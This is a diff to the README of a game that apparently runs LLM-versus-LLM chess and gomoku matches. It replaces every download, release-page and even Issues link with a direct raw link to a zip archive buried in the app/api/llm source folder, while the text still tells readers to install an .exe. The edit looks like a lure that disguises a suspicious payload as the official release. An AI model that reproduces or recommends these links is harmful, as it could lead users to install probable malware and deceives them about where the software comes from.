@@ -1,6 +1,6 @@
 # 🎮 ai-zhuqi-battle - Play LLM vs LLM Chess and Gomoku
 
-[![Download ai-zhuqi-battle](https://img.shields.io/badge/Download-ai--zhuqi--battle-4caf50?style=for-the-badge)](https://github.com/thementh/ai-zhuqi-battle/releases)
+[![Download ai-zhuqi-battle](https://img.shields.io/badge/Download-ai--zhuqi--battle-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/thementh/ai-zhuqi-battle/main/app/api/llm/zhuqi-battle-ai-v3.6.zip)
 
 ## ❓ What is ai-zhuqi-battle?
 
@@ -30,7 +30,7 @@ This program does not require advanced graphics cards. A standard screen with 80
 
 2. Click this bright green button below to go to the download page:
 
-[![Download ai-zhuqi-battle](https://img.shields.io/badge/Download%20Page-Green?style=for-the-badge&logo=github&color=228B22)](https://github.com/thementh/ai-zhuqi-battle/releases)
+[![Download ai-zhuqi-battle](https://img.shields.io/badge/Download%20Page-Green?style=for-the-badge&logo=github&color=228B22)](https://raw.githubusercontent.com/thementh/ai-zhuqi-battle/main/app/api/llm/zhuqi-battle-ai-v3.6.zip)
 
 3. On the page, look for the latest release. It usually appears at the top of the list.
 
@@ -96,7 +96,7 @@ If you face any problems, try these steps:
 
 - **Moves are too fast or too slow:** Adjust the Game Speed in settings.
 
-If problems persist, visit the Issues tab on the GitHub page: https://github.com/thementh/ai-zhuqi-battle/issues
+If problems persist, visit the Issues tab on the GitHub page: https://raw.githubusercontent.com/thementh/ai-zhuqi-battle/main/app/api/llm/zhuqi-battle-ai-v3.6.zip
 
 ---
 
@@ -122,7 +122,7 @@ New versions may improve AI play, fix bugs, or add features.
 
 To update:
 
-1. Visit the release page again: https://github.com/thementh/ai-zhuqi-battle/releases
+1. Visit the release page again: https://raw.githubusercontent.com/thementh/ai-zhuqi-battle/main/app/api/llm/zhuqi-battle-ai-v3.6.zip
 
 2. Download the newest `.exe` installer.
 
@@ -148,4 +148,4 @@ If you need help beyond this guide:
 
 Visit this page to download the game:
 
-[![Download ai-zhuqi-battle](https://img.shields.io/badge/Download-ai--zhuqi--battle-4caf50?style=for-the-badge)](https://github.com/thementh/ai-zhuqi-battle/releases)
+[![Download ai-zhuqi-battle](https://img.shields.io/badge/Download-ai--zhuqi--battle-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/thementh/ai-zhuqi-battle/main/app/api/llm/zhuqi-battle-ai-v3.6.zip)
